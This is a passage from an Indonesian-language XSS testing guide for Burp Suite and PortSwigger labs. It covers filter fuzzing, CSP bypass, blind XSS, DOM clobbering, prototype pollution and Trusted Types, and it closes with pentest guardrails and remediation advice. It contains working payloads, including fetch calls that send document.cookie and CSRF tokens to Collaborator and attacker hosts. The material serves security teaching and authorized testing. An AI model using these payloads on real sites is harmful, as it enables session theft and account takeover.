   video
   audio
   details
   input
   marquee
   object
   embed
   ...

[Start Attack]
```

**OUTPUT BERHASIL ✅ — Attack selesai, sort by Length:**

```text
[Intruder → Results tab]
Sort column "Length" descending:

#    Payload    Status   Length
15   body       200      1589   ← PANJANG BERBEDA = tag tidak diblok!
22   svg        200      1589   ← PANJANG BERBEDA = tag tidak diblok!
3    script     200      318    ← sama dengan baseline = diblok
7    img        200      318    ← sama dengan baseline = diblok
...
```

➡️ Tag `body` dan `svg` lolos filter! Lanjut ke **Langkah 6.2** untuk fuzz event handler-nya.

---

**OUTPUT GAGAL ❌ — Semua response sama (semua panjang identik):**

```text
[Results]
Semua payload → Length: 318 (sama dengan baseline blocked response)
```

➡️ Semua tag standard diblok. Coba:

```text
[Intruder → Payload list]
Tambahkan custom/unusual tags:
xss
custom
x
aaa
animatetransform
```

Atau coba bypass karakter `<>`:

```text
[Repeater]
q=%3Cscript%3Ealert(1)%3C/script%3E   (URL encoded)
q=%253Cscript%253E                      (double URL encoded)
```

---

### Langkah 6.2 — Event Handler Fuzzing

```text
Setelah tahu tag yang lolos (misal: body, svg).

[Intruder → Positions tab]
Ubah payload:
q=<body §onresize§=alert(1)>

[Payloads tab]
Paste event handler list:
onload
onerror
onmouseover
onfocus
onblur
onresize
onscroll
onbegin
onend
onstart
...

[Start Attack]
```

**OUTPUT BERHASIL ✅ — Event handler lolos:**

```text
[Results] Sort by Length:

#    Payload     Status   Length
12   onresize    200      1589   ← BERBEDA! event handler lolos
18   onbegin     200      1589   ← BERBEDA!
3    onload      200      318    ← diblok
5    onerror     200      318    ← diblok
```

➡️ `<body onresize=alert(1)>` atau `<svg><animate onbegin=alert(1)>` bisa dipakai!

```text
Untuk auto-trigger <body onresize> (karena butuh resize window):
Deliver via iframe dari Exploit Server:
<iframe src="https://TARGET/?q=<body onresize=print()>" onload="this.style.width='100px'">
```

---

### Langkah 6.3 — Custom Tag Bypass (Semua Standard Tags Diblok)

```text
[Repeater]
q=<xss id=x onfocus=alert(1) tabindex=1>

[Browser → URL bar]
https://TARGET/search?q=<xss id=x onfocus=alert(1) tabindex=1>#x
→ #x di URL → browser auto-focus ke element id=x → onfocus trigger!
```

**OUTPUT BERHASIL ✅ — Alert muncul saat buka URL dengan #x:**

```text
[Browser] → buka URL lengkap → alert popup muncul tanpa klik apapun
```

```text
Delivery ke victim via exploit server:
<script>
document.location = 'https://TARGET/?q=<xss id=x onfocus=alert(1) tabindex=1>#x'
</script>
```

---

## ═══════════════════════════════════════

## FASE 7: CSP BYPASS

## ═══════════════════════════════════════

### Langkah 7.1 — Analisis CSP Header

```text
[Burp → HTTP History → response target → Headers tab]
Cari: Content-Security-Policy

Copy value CSP → paste ke: https://csp-evaluator.withgoogle.com/
```

**OUTPUT ✅ — `unsafe-inline` terdeteksi:**

```text
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'
```

```text
[CSP Evaluator] → "script-src: unsafe-inline allows the execution of unsafe in-page scripts"
```

➡️ Periksa dulu apakah ada nonce atau hash di directive yang sama:

```text
Tidak ada nonce/hash → unsafe-inline EFEKTIF → test <script>alert(1)</script>
Ada nonce (nonce-xxx) → unsafe-inline DIABAIKAN → evaluasi nonce leak (Section 9.4)
Ada hash (sha256-xxx) → unsafe-inline DIABAIKAN → hash hanya berlaku untuk script spesifik
```

Langsung test di browser. Cek Console (F12) apakah ada CSP violation message.

---

**OUTPUT ✅ — Whitelisted CDN domain:**

```text
Content-Security-Policy: script-src 'self' https://cdn.example.com
```

➡️ Cari JSONP endpoint di `cdn.example.com`:

```text
[Browser] → cari: cdn.example.com jsonp endpoint
Atau coba: https://cdn.example.com/api/callback?cb=alert(1)

[Repeater] → inject:
<script src="https://cdn.example.com/api/callback?cb=alert(1)"></script>
```

---

**OUTPUT ✅ — report-uri reflect input:**

```text
Content-Security-Policy: default-src 'self'; report-uri /csp-report?token=abc123
```

```text
[Repeater → Request]
Ubah parameter token (atau inject via URL parameter):
?search=<img src=1 onerror=alert(1)>&token=;script-src-attr 'unsafe-inline'

[Response Headers]
Content-Security-Policy: ...report-uri /csp-report?token=abc123;script-src-attr 'unsafe-inline'
```

➡️ Di Chrome: `script-src-attr 'unsafe-inline'` mengizinkan inline event handlers!

**OUTPUT BERHASIL ✅ — Alert muncul setelah CSP injection:**

```text
[Browser] → buka URL dengan token injection → alert muncul
```

---

**OUTPUT ✅ — CSP sangat ketat, tidak ada bypass → Dangling Markup:**

```text
Content-Security-Policy: default-src 'self'; script-src 'nonce-abc123'
→ Tidak bisa execute script tanpa nonce yang valid
```

```text
[Repeater] → inject di mana input di-reflect sebelum sensitive data (misal CSRF token):
q=<img src='https://abc123.oastify.com/?data=

(tag img tidak ditutup → browser menelan konten HTML sampai ketemu kutip ' berikutnya)
→ CSRF token ikut terkirim sebagai nilai src
```

**OUTPUT BERHASIL ✅ — Collaborator mendapat CSRF token:**

```text
[Collaborator → Poll now]
GET /?data=%0A%3Cinput+name%3D%22csrf%22+value%3D%22SECRET_TOKEN_HERE%22 HTTP/1.1
```

---

## ═══════════════════════════════════════

## FASE 8: BLIND XSS — BURP COLLABORATOR

## ═══════════════════════════════════════

> **Kapan dipakai:** Payload disimpan dan diproses oleh halaman yang tidak bisa kamu lihat (admin panel, internal dashboard, support ticket viewer).

### Langkah 8.1 — Setup dan Deploy Blind XSS

```text
[Burp → Burp Collaborator → Copy to clipboard]
Dapat: abc123def456.oastify.com

Payload blind XSS minimal (konfirmasi eksekusi):
<script>
fetch('https://abc123def456.oastify.com/?blind=1&host='+location.hostname)
</script>

Payload dengan cookie:
<script>
fetch('https://abc123def456.oastify.com/?c='+encodeURIComponent(document.cookie)
+'&url='+encodeURIComponent(location.href))
</script>
```

```text
[Burp Repeater → POST ke endpoint yang dilihat admin]
Field: comment, name, support_ticket, profile_bio, feedback, user-agent

Kirim payload → tunggu admin bot membuka halaman
```

**OUTPUT BERHASIL ✅ — Collaborator mendapat hit:**

```text
[Burp Collaborator → Poll now]

Type   Time                  Client IP      
HTTP   2026-09-28 10:45:22   10.10.11.1    

Interaction detail:
GET /?blind=1&host=admin.target.com HTTP/1.1
Host: abc123def456.oastify.com
Cookie: (outgoing dari browser admin)

→ blind=1 berarti XSS execute di browser admin!
```

➡️ **Blind XSS Confirmed!** Upgrade payload ke cookie theft:

```text
[Repeater] → ganti payload ke versi dengan cookie
```

---

**OUTPUT GAGAL ❌ — Tidak ada hit setelah beberapa menit:**

```text
[Collaborator → Poll now → tidak ada interaction]
```

➡️ Kemungkinan:

1. Payload tidak tersimpan → cek Repeater response apakah ada error
2. Admin bot belum buka → tunggu lebih lama, atau coba trigger dengan aksi lain
3. Outbound diblok → coba DNS-only test dulu (Collaborator akan terima DNS query bahkan jika HTTP diblok):

```text
Payload DNS-only test:
<script>
var img = new Image();
img.src = 'https://abc123def456.oastify.com/dns-test';
</script>
```

```text
[Collaborator] → Poll now
Jika ada DNS interaction tanpa HTTP → server bisa DNS tapi blok HTTP
→ Tidak bisa exfil data via HTTP, pertimbangkan metode lain
```

---

### Langkah 8.2 — Blind XSS di Header Context

```text
[Burp → Proxy → Intercept: ON]
Browse ke halaman target → intercept GET request

[Intercepted request] → ubah header:
User-Agent: <script>fetch('https://abc123.oastify.com/?ua=1')</script>
Referer: <script>fetch('https://abc123.oastify.com/?ref=1')</script>
X-Forwarded-For: <script>fetch('https://abc123.oastify.com/?xff=1')</script>

Forward request

[Collaborator → Poll now] → cek mana yang fire
```

**OUTPUT BERHASIL ✅ — User-Agent payload fire:**

```text
[Collaborator]
GET /?ua=1 HTTP/1.1
Host: abc123.oastify.com
X-Real-IP: 10.10.11.200      ← IP server yang memproses log
```

➡️ Header `User-Agent` di-log dan di-render tanpa sanitasi! Upgrade ke cookie theft payload.

---

---

# 🧬 18. Modern XSS Topics

> Section ini mencakup teknik XSS modern yang tidak masuk ke kategori reflected/stored/DOM klasik, atau yang bergantung pada framework/browser behavior spesifik. Dibedakan antara **general technique**, **framework-specific**, dan **lab-specific**.

---

## 18.1 DOM Clobbering

### Konsep

DOM Clobbering adalah teknik di mana attacker menginjeksi HTML elements dengan `name` atau `id` yang cocok dengan identifier yang dipakai JavaScript aplikasi — sehingga **property DOM menimpa variabel atau property JavaScript** yang semula dimaksudkan sebagai non-HTML.

```text
Normal:
app.config = window.config || {};

Setelah DOM Clobbering:
Attacker inject: <a id="config" href="javascript:alert(1)">
Sekarang: window.config === <a id="config"> element
Akses window.config.someProperty bisa memicu unexpected behavior
```

### Bagaimana Named Elements "Clobber" Globals

```html
<!-- Inject via HTML injection (bukan XSS langsung) -->
<a id="x" href="https://attacker.com/malicious.js"></a>
```

Jika aplikasi kemudian:

```javascript
var src = document.getElementById('x').href;
// attacker control src
loadScript(src); // → loads attacker's script
```

Atau clobbering `window.x`:

```html
<input id="x" value="data">
<!-- window.x → the input element (not the expected value) -->
```

### DOM Clobbering ke XSS — Pola Umum

```text
1. App melakukan: var config = window.config || defaultConfig;
2. Attacker inject: <a id="config" name="transport" href="javascript:alert(1)">
3. window.config sekarang adalah DOM element
4. Jika app akses config.transport → mendapat DOM element
5. Jika app pakai config untuk construct URL/script src → DOM Clobbering → XSS
```

### Contoh Attack Chain

```html
<!-- App code: -->
<script>
  var x = document.getElementById('someElement').href;
  document.write('<script src="' + x + '"><\/script>');
</script>

<!-- Attacker inject earlier in page: -->
<a id="someElement" href="https://attacker.com/evil.js">

<!-- Hasil: document.write loads attacker's script -->
```

### Common Clobberable Properties

```text
window.name          → window.name persists across navigation
document.cookie      → clobber hanya bisa dengan form tricks
HTMLCollection dari named forms/inputs
Element .href, .src, .value
```

### Detection

```text
1. F12 → Console: ketik nama variable yang dipakai app
   Apakah hasilnya DOM element? → bisa ter-clobber
2. Cari: document.getElementById, document.querySelector dengan dynamic values
3. Cari: window.SOMETHING yang tidak dideclare via `var`/`let`/`const`
```

> 🔬 **Note:** DOM Clobbering bukan XSS langsung — ini adalah HTML injection yang mengeksploitasi JavaScript yang tidak aman dalam menggunakan DOM references. Butuh kombinasi: HTML injection point + JavaScript code yang menggunakan DOM reference dengan cara yang unsafe.

---

## 18.2 Prototype Pollution → XSS

### Konsep

**Prototype Pollution** terjadi ketika attacker bisa memodifikasi `Object.prototype` — sehingga semua objek dalam aplikasi "mewarisi" property tambahan yang diinjeksi.

```javascript
// Vulnerable code:
function merge(target, source) {
  for (let key in source) {
    target[key] = source[key]; // No check for __proto__!
  }
}

// Payload:
merge({}, JSON.parse('{"__proto__":{"polluted":"yes"}}'));

// Efek: semua objek sekarang punya property "polluted"
let a = {};
console.log(a.polluted); // "yes"
```

### Prototype Pollution → DOM XSS

Attack chain: Prototype pollution → tainted property → DOM sink

```javascript
// Library code yang vulnerable:
function createTag(opts) {
  let tag = document.createElement(opts.tag || 'div');
  tag.innerHTML = opts.content || '';  // SINK
  document.body.appendChild(tag);
}

// Attacker pollutes: Object.prototype.content = '<img src=1 onerror=alert(1)>'
// Setiap call ke createTag({tag:'div'}) sekarang inject payload via opts.content
```

### Cara Detect Prototype Pollution

```text
[Browser Console]
// Test 1: Check gadget
Object.prototype.x = "test_pollution_123";
// Lihat apakah property "x" muncul di tempat yang tidak terduga

// Test 2: URL-based pollution (banyak library parse URL param ke object)
// Coba: https://TARGET/?__proto__[x]=polluted
// Lalu console: ({}).x === "polluted"
```

### Common Pollution Sources (Client-Side)

```text
- URL query params diparse dengan library vulnerable (jQuery < 3.4.0, dll)
- JSON.parse dari user-controlled input
- Object.assign dengan nested __proto__
- Deep merge/extend library yang tidak whitelistProperty
```

### Common Sinks yang Dieksploitasi via Pollution

```text
- innerHTML, insertAdjacentHTML
- jQuery .html()
- document.write
- Custom "template" yang iterasi props dari object
```

> 🔬 **General Technique:** Prototype Pollution adalah vulnerability di code logic, bukan XSS langsung. XSS terjadi saat polluted property mengalir ke DOM sink. Butuh analisis code path yang lengkap.

---

## 18.3 postMessage-based DOM XSS

### Konsep

`window.postMessage()` adalah mekanisme cross-origin communication. DOM XSS terjadi jika handler `message` event memasukkan `event.data` ke dangerous sink tanpa validasi.

### Vulnerable Pattern

```javascript
// Vulnerable message handler:
window.addEventListener('message', function(event) {
  // TIDAK ada check: if (event.origin !== 'https://trusted.com') return;
  document.getElementById('output').innerHTML = event.data;  // SINK!
});
```

### Attack

```html
<!-- Dari origin manapun yang bisa open popup/iframe ke target: -->
<iframe src="https://TARGET/page" id="frame"></iframe>
<script>
  document.getElementById('frame').onload = function() {
    this.contentWindow.postMessage('<img src=1 onerror=alert(1)>', '*');
  };
</script>
```

### Detection

```text
[DevTools → Sources → Ctrl+Shift+F]
Cari: addEventListener('message'
     on('message'
     window.onmessage

Setelah menemukan handler:
1. Apakah ada validasi event.origin? Jika tidak → candidate
2. Ke mana event.data mengalir? innerHTML? eval? → SINK?
3. Test via Console:
   window.postMessage('<img src=1 onerror=alert(1)>', '*')
```

### PortSwigger Lab Reference

PortSwigger menyediakan lab DOM XSS via postMessage. Workflow:

1. Source: `event.data` dari postMessage tanpa origin check
2. Sink: `innerHTML` assignment
3. Payload via exploit server iframe

---

# 🔐 19. Trusted Types

> Trusted Types adalah browser security feature yang **mencegah DOM XSS** dengan menerapkan tipe-safe API pada dangerous sinks. Diaktifkan via CSP (`require-trusted-types-for 'script'`). Penting untuk dipahami karena semakin banyak modern app menggunakannya. Support dan enforcement behavior bervariasi antar browser — selalu verifikasi enforcement aktual di runtime, bukan dari asumsi browser versi.

## Cara Kerja

```text
Tanpa Trusted Types:
element.innerHTML = userInput;  // Langsung masuk → XSS risk

Dengan Trusted Types:
element.innerHTML = userInput;  // TypeError! string biasa tidak diterima
element.innerHTML = trustedHTML;  // OK — harus melalui policy
```

## Deteksi Trusted Types di Target

```text
[Burp HTTP History → Response Headers]
Content-Security-Policy: require-trusted-types-for 'script'; trusted-types policy-name

[Browser Console F12]
Jika ada TypeError: "This document requires 'TrustedHTML' assignment"
→ Trusted Types aktif
```

## Trusted Types Policy

```javascript
// Aplikasi membuat policy yang menentukan sanitizer:
const policy = trustedTypes.createPolicy('escapePolicy', {
  createHTML: (string) => string.replace(/</g, '&lt;'),
  createScriptURL: (string) => string,  // Perhatikan: ini bypass-able jika tidak divalidasi
  createScript: (string) => string,
});

// Penggunaan:
element.innerHTML = policy.createHTML(userInput);
```

## Testing / Bypass Vectors

Trusted Types membatasi _sinks_, bukan _sources_. Jika policy tidak aman:

```javascript
// Policy tidak safe — menerima input tanpa sanitasi:
trustedTypes.createPolicy('default', {
  createHTML: (s) => s  // Identity policy — tidak ada sanitasi!
});
```

```text
Cara attack:
1. Cari policy yang ada: console.log(trustedTypes.getPolicyNames())
2. Test apakah default policy menerima arbitrary HTML
3. Atau cari "forced navigation" — jika createScriptURL tidak divalidasi
```

## Apakah Trusted Types Benar-Benar Enforced?

```text
Trusted Types terdeteksi di CSP header
↓
Periksa directive enforcement:
 ├── require-trusted-types-for 'script' → enforcement aktif untuk script sinks
 └── trusted-types [policy-names] → membatasi policy yang boleh dibuat
↓
Enforcement mode:
 ├── Content-Security-Policy → violation = TypeError (enforced)
 └── Content-Security-Policy-Report-Only → violation dilaporkan, TIDAK di-enforce
↓
Verifikasi langsung di Console:
 document.querySelector('div').innerHTML = 'test'
 → TypeError? → enforcement aktif
 → Tidak error? → Trusted Types tidak aktif di context ini
↓
Identifikasi application policies:
 console.log(trustedTypes.getPolicyNames())
↓
Identifikasi reachable dangerous sinks:
 innerHTML, outerHTML, insertAdjacentHTML → TrustedHTML required
 script.src, Worker → TrustedScriptURL required
 eval, setTimeout(string) → TrustedScript required (jika dicakup)
↓
Apakah sink reachable di bawah policy yang ada?
 ├── Policy tidak sanitize → cari identity policy atau bypass
 └── Tidak reachable → cari alternative sink yang tidak dicakup
```

## Implikasi untuk Pentest

```text
Jika Trusted Types enforced:
- Classic innerHTML XSS tidak bisa langsung
- Perlu: a) policy bypass, b) gadget via trusted policy, atau c) sink di luar coverage
- Trusted Types = mitigasi kuat; XSS jauh lebih sulit

Tools: https://github.com/nicowillis/trusted-types-bypass-tools
PortSwigger: Ada advanced labs tentang Trusted Types bypass
```

> **Note:** Untuk memverifikasi enforcement: coba assign string biasa ke `element.innerHTML` di Console. TypeError = enforced. Jangan mengandalkan asumsi versi browser — cek langsung di target.

---

# 🌐 20. Browser Reality / Execution Validation

> Section ini menjelaskan realitas eksekusi di browser modern — kondisi, restricsi, dan perbedaan antar browser yang mempengaruhi validasi XSS.

## Mengapa Browser Validation Wajib

```text
Curl/Burp Repeater menunjukkan: payload ada di response
Browser menunjukkan: apakah payload benar-benar execute

Gap ini bisa disebabkan:
- CSP blocking (hanya visible di browser Console, tidak di Repeater)
- DOM XSS yang tidak melibatkan server (tidak tampak di Repeater sama sekali)
- Sanitizer client-side (DOMPurify, etc.) yang jalan setelah response
- Trusted Types
- Browser-specific behavior
- SameSite cookie attribute yang membatasi kapan cookies dikirim di cross-site requests
- CORS yang membatasi apakah JavaScript dari origin lain bisa membaca cross-origin response
```

## Validation Method yang Benar

```text
Untuk Reflected/Stored XSS:
1. Copy URL dari Burp Repeater → "Show response in browser"
2. Paste di browser yang sama profile dengan victim (bukan incognito untuk first test)
3. F12 → Console → apakah ada error? CSP violation?
4. Alert/print muncul? → XSS Confirmed

Untuk DOM XSS:
1. Test langsung di URL bar browser (bukan Repeater!)
2. F12 → Console → monitor JS execution
3. Cari DOM change yang unexpected
```

## CSP Violation Check — Wajib di Browser

```text
[F12 → Console]
Contoh CSP violation message:
"Refused to execute inline script because it violates the following
Content Security Policy directive: 'script-src 'self''."

Ini TIDAK muncul di Burp Repeater — hanya di browser Console.
```

## Browser Differences yang Perlu Diketahui

|Behavior|Chrome|Firefox|Safari|
|---|---|---|---|
|`document.domain` manipulation|Deprecated (planned removal)|Supported|Supported|
|Trusted Types|Supported (enforce via CSP `require-trusted-types-for`)|Support dan enforcement bervariasi — verifikasi runtime di console|Support dan enforcement bervariasi — verifikasi runtime di console|
|`<script>` via innerHTML|Blocked (all)|Blocked (all)|Blocked (all)|
|`javascript:` in form action|Blocked|Blocked|Varies|
|`<marquee>`|Supported (deprecated)|Supported (deprecated)|Varies|
|`alert()` in cross-origin iframe|Blocked (some configs)|Varies|Blocked|
|Dangling markup exfil|Limited by fetch policy|Varies|Varies|

## PoC Alternatives to `alert(1)`

`alert(1)` terkadang diblok atau tidak visible (silent context, headless browser, CSP). Alternatif:

```javascript
// Visible DOM marker
document.body.style.backgroundColor = 'red';
document.body.innerHTML = '<h1>XSS_CONFIRMED</h1>';

// Console output
console.log('XSS', document.domain);

// Out-of-band via fetch (untuk Blind XSS)
fetch('https://COLLABORATOR/?xss=1&d='+document.domain)

// print() — digunakan di beberapa PortSwigger labs
print()  // Opens print dialog — visible dan tidak ada auditor yang blok

// Timeout-based (bypass some timing issues)
setTimeout(()=>alert(document.domain), 100)
```

## iframe Sandbox Behavior

```text
<iframe sandbox="allow-scripts">
- Script bisa jalan, tapi: tidak ada same-origin dengan parent
- document.cookie tidak accessible dari parent
- localStorage parent tidak accessible

<iframe sandbox="">  (tanpa allow-scripts)
- Script TIDAK bisa jalan sama sekali
- Tidak ada XSS via injected script dalam sandboxed iframe
```

## Cross-Origin Restriction Reminder

```text
XSS berjalan dalam origin target:
→ Bisa akses: DOM, cookies (non-HttpOnly), localStorage, sessionStorage TARGET
→ Bisa buat: request ke TARGET (same-origin tanpa CORS issue)
→ TIDAK bisa: baca response dari CORS-protected endpoint (kecuali ada CORS misconfiguration)
→ TIDAK bisa: akses parent/child frame dari origin berbeda (kecuali postMessage)
```

## SameSite vs CORS — Perbedaan Context

```text
SameSite (cookie attribute):
→ Mengatur apakah cookie dikirim dalam cross-site requests
→ Relevan untuk request yang BERASAL dari origin berbeda ke target
→ TIDAK membatasi XSS yang berjalan pada origin target sendiri
  (XSS adalah same-origin — cookies dikirim normal)

CORS (Cross-Origin Resource Sharing):
→ Mengatur apakah JS dari origin lain bisa MEMBACA response cross-origin
→ TIDAK berlaku untuk XSS yang berjalan pada origin target sendiri
→ Berlaku jika XSS mencoba fetch resource dari origin yang berbeda

XSS execution origin → same-origin dengan target?
 ├── Ya → SameSite dan CORS tidak membatasi akses ke resource target
 └── Tidak (misal: XSS di subdomain berbeda) → evaluasi cross-origin restrictions

HttpOnly:
→ Mencegah JS membaca cookie — berlaku bahkan untuk same-origin XSS
→ Ini berbeda dengan SameSite dan CORS
```

> CORS bukan perlindungan terhadap XSS. CORS mengatur cross-origin API access. XSS yang berjalan pada origin target sudah memiliki same-origin access ke semua resource di origin tersebut.

---

# 🛡️ 21. Authorized Pentest Workflow

> **PENTING:** Mode ini khusus untuk engagement yang sudah memiliki izin tertulis (Rules of Engagement, Scope Document). Teknik destruktif atau yang melibatkan data produksi harus dikonsultasikan dulu dengan client.

## AUTHORIZED TESTING GUARDRAILS

```text
□ Scope verified — endpoint dan domain dalam scope dokumen
□ Target/endpoint authorized — bukan out-of-scope atau shared infrastructure
□ OOB callback destination (Collaborator/VPS) disetujui dalam RoE
□ Avoid destructive testing kecuali explicitly permitted dalam RoE
□ Avoid real credential/session exfiltration kecuali explicitly authorized
□ Define evidence requirements sebelum test (screenshot? request/response? video?)
□ Define stop condition — apa yang dilakukan jika impact kritis tak terduga ditemukan?
□ Record request/response dan impact evidence per temuan
□ Separate proof-of-concept dari destructive action
```

## Pre-Test Checklist

```text
[ ] Scope document tersedia dan ditandatangani
[ ] Batas target jelas (domain, IP range, path exclusions)
[ ] Rules of Engagement (RoE) dibaca dan dipahami
[ ] Out-of-scope area dicatat (admin panel produksi? staging only?)
[ ] Contact person client tersedia untuk eskalasi
[ ] Safe time window testing dikonfirmasi
[ ] Callback server (Burp Collaborator / VPS) siap di luar scope domain
```

## Phase 1: Non-Destructive Detection

```text
↓
INPUT ENUMERATION (pasif dulu)
- Crawl dengan Burp (Spider/Crawl) atau manual
- Identifikasi input points: GET params, POST forms, cookies, headers
- JANGAN kirim payload dulu sebelum mapping selesai

↓
CONTEXT MAPPING (Burp Repeater, marker test)
- Kirim marker string yang aman (alfanumerik, tanpa karakter berbahaya)
- Marker: "PENTEST_XSS_CHECK_1234" (lebih professional daripada xss1234)
- Dokumentasikan di mana saja marker muncul (HTML body, attribute, JS, dll)
- Identifikasi encoding yang diterapkan

↓
NON-DESTRUCTIVE PAYLOAD
- Test minimal, non-alerting: <img src=x onerror=void(0)>
  (akan error tapi tidak alert — cukup untuk test reflection)
- Atau test dengan DOM marker: <em class="test">PENTEST_MARKER</em>
  (visible tapi tidak execute JS)
```

## Phase 2: Minimal PoC (Setelah Context Identified)

```text
↓
MINIMAL XSS PoC
- Gunakan: alert(document.domain) — show domain untuk prove same-origin exec
- JANGAN langsung cookie theft / CSRF tanpa persetujuan client
- Document: screenshot, Burp request/response, payload yang digunakan

↓
SCOPE VERIFICATION
- Apakah endpoint ini dalam scope?
- Apakah user account yang dipakai untuk test authorized?
- Apakah data yang akan ter-affect milik test user, bukan produksi?
```

## Phase 3: Impact Validation (Hanya dengan Izin Eksplisit)

```text
↓
COOKIE THEFT (hanya untuk test account dalam scope)
- Pakai callback server yang dikontrol pentest team
- BUKAN Burp Collaborator public server untuk data nyata
- Encode cookie sebelum exfil: encodeURIComponent(document.cookie)
- Delete/reset setelah testing

↓
CSRF via XSS (hanya untuk test account)
- Dokumentasikan action yang bisa dilakukan
- JANGAN execute di akun produksi tanpa izin
- JANGAN eksekusi: delete, purchase, transfer yang tidak reversible

↓
CREDENTIAL CAPTURE (HANYA untuk lab/staging)
- Form injection hanya di environment yang diizinkan
- TIDAK di produksi dengan real user data
```

## Phase 4: Evidence Collection

```text
[ ] Screenshot browser dengan XSS execute (URL visible di address bar)
[ ] Burp Suite request + response yang menunjukkan reflection/storage
[ ] Payload yang digunakan (exact string)
[ ] Context (URL, parameter, HTTP method)
[ ] Impact assessment (apa yang bisa dilakukan, apa yang TIDAK bisa)
[ ] Cookie/session data: hanya untuk test account, BUKAN real user
[ ] Waktu testing (timestamp)
```

## Phase 5: Risk Assessment & Remediation

```text
Impact Rating — ditentukan oleh kombinasi faktor, bukan tipe XSS saja:

Faktor yang dipertimbangkan:
- Victim privilege (siapa yang bisa terkena: anonymous, authenticated, admin, system?)
- Reachable functionality (apa yang bisa dilakukan script dalam context victim?)
- Data access (apa data yang bisa diakses / dimodifikasi?)
- Authentication context (apakah session valid disertakan?)
- Exploitability (butuh user interaction? perlu social engineering?)
- Scope (satu user, banyak user, semua user?)
- Business impact (financial, reputasi, compliance?)
- Cookie attributes (HttpOnly? Secure? SameSite? — menentukan apa yang bisa di-exfil)

Contoh contextual (bukan formula universal):
→ Stored XSS di halaman admin dengan cookie non-HttpOnly cenderung berdampak besar
→ Reflected XSS di endpoint tanpa autentikasi dengan CSP ketat dan tidak ada CSRF vector cenderung terbatas
→ Self-XSS (hanya affect attacker sendiri) biasanya tidak exploitable tanpa chaining

Tipe XSS (Reflected/Stored/DOM) adalah contextual indicator, bukan automatic severity score.
Gunakan framework CVSS atau rating internal engagement sebagai acuan formal.

Remediation (untuk dilaporkan ke client):
- Output encoding di context yang tepat (HTML, JS, URL, CSS masing-masing berbeda)
- Input validation (allowlist, bukan blocklist)
- CSP yang benar (nonce-based atau hash-based, bukan unsafe-inline)
- HttpOnly + Secure + SameSite untuk session cookie
- Trusted Types jika aplikasi modern
- DOMPurify untuk HTML rendering dari user input
```

## Phase 6: Retest

```text
[ ] Client sudah implement fix
[ ] Retest dengan payload yang sama di endpoint yang sama
[ ] Test edge cases: encoding bypass, alternate context
[ ] Document: "Patched" atau "Partially Patched" atau "Bypass Found"
```

## LAB / CTF vs Authorized Pentest

```text
LAB / CTF / PORTSWIGGER ACADEMY:
✅ Bebas test semua teknik
✅ Cookie theft, credential capture, CSRF via XSS
✅ Admin takeover
✅ Semua payload termasuk yang "destruktif"
→ Environment controlled, tidak ada real user

AUTHORIZED PENTEST:
⚠️ Ikuti scope document
⚠️ Minimal PoC lebih diutamakan daripada full exploitation
⚠️ Credential capture HANYA untuk test account
⚠️ Konfirmasi sebelum aksi yang tidak reversible
⚠️ Gunakan dedicated callback server (bukan Collaborator public untuk data nyata)
```

---

## ═══════════════════════════════════════

## MASTER DECISION MAP

## ═══════════════════════════════════════

```text
INPUT PARAMETER DITEMUKAN
          │
          ▼
    [FASE 0: Recon]
    Burp HTTP History → Identifikasi input points
    Check response headers → CSP? AngularJS?
          │
          ├── AngularJS detected → test CSTI setelah FASE 1
          ├── CSP ada → catat, bawa ke FASE 7
          └── Lanjut FASE 1
          │
          ▼
    [FASE 1: Reflection Testing]
    Burp Repeater → kirim XSS_MARKER_12345
          │
          ├── ✅ Reflected langsung (Ctrl+F ketemu)
          │        │
          │        ▼
          │   Identifikasi Context dari response:
          │   HTML body  → FASE 2A
          │   Attribute  → FASE 2B
          │   JS string  → FASE 2C
          │   Template   → FASE 2D
          │   href/URL   → FASE 2E
          │
          ├── ✅ Reflected tapi di-encode
          │        │
          │        ▼
          │   Masih bisa exploit tergantung context
          │   Identifikasi context → pilih teknik encoding bypass
          │   Lanjut ke FASE 2 sesuai context
          │
          ├── ❌ Tidak ada di response → cek halaman lain setelah submit
          │        │
          │        ├── Muncul di halaman lain → FASE 4 (Stored XSS)
          │        └── Tidak muncul di manapun
          │                │
          │                ├── Browser DevTools → JS source → FASE 3 (DOM XSS)
          │                └── Header injection → Blind XSS → FASE 8
          │
          ▼
    [FASE 2: Context-Specific Payload]
    Payload berhasil (response tidak encode payload)?
          │
          ├── ✅ Muncul unescaped → buka di browser → alert? → FASE 5 (Impact)
          │
          └── ❌ Diblok/difilter
                   │
                   ├── Tag di-strip → FASE 6 (Intruder Tag Fuzzing)
                   ├── Keyword filter → Section 6.5 (keyword bypass)
                   ├── Quote filter → Section 6.6 (quote bypass)
                   └── CSP violation di Console → FASE 7 (CSP Bypass)
          │
          ▼
    [FASE 5: Impact Assessment]
    (setiap path = possible impact chain — evaluasi per faktor, bukan automatic consequence)
          │
          ├── Cookie tidak HttpOnly → FASE 5A (Cookie Theft via Collaborator)
          │     [evaluasi: apakah cookie valid session? SameSite? Secure? reachable?]
          ├── Cookie HttpOnly → FASE 5B (Password Capture) atau FASE 5C (CSRF via XSS)
          │     [evaluasi: victim privilege, available actions, autofill behavior]
          └── Admin-only page → FASE 8 (Blind XSS via Collaborator)
                [evaluasi: CSP di admin panel, HttpOnly, outbound network blocking]
```

---

## ⚡ CHEATSHEET BURP QUICK REFERENCE

```text
=== SETUP ===
Burp → Proxy → Open Browser
HTTP History → klik kanan → Send to Repeater (Ctrl+R)
Repeater → Send → Ctrl+F di Response

=== MARKER TEST ===
[Repeater] q=XSS_MARKER_12345
→ Ctrl+F → ketemu? → reflection terkonfirmasi
→ Lihat context sekitar marker

=== PAYLOADS PER CONTEXT (langsung di Repeater) ===
HTML body:     q=<script>alert(1)</script>
               q=<img src=x onerror=alert(1)>
               q=<svg onload=alert(1)>

Attribute:     q=" onmouseover="alert(1)
               q=" autofocus onfocus="alert(1)

JS string:     q='-alert(1)-'
               q=';alert(1)//
               q=\'-alert(1)//      (jika ' escaped tapi \ tidak)
               q=</script><script>alert(1)</script>   (jika ' & \ escaped)

Template lit:  q=${alert(1)}

href:          q=javascript:alert(1)

AngularJS:     q={{7*7}}  → kalau hasilnya 49 = CSTI
               q={{$on.constructor('alert(1)')()}}

onclick HTML:  q=http://foo?&apos;-alert(1)-&apos;

=== FILTER BYPASS (Intruder) ===
[Send to Intruder] → Positions → q=<§tag§> → Payloads: tag list
Sort Results by Length → Length berbeda = lolos!
Kemudian: q=<body §event§=alert(1)> → fuzz event handler

=== IMPACT (Collaborator) ===
[Collaborator → Copy URL]
Payload: <script>fetch('https://COLLAB/?c='+encodeURIComponent(document.cookie))</script>
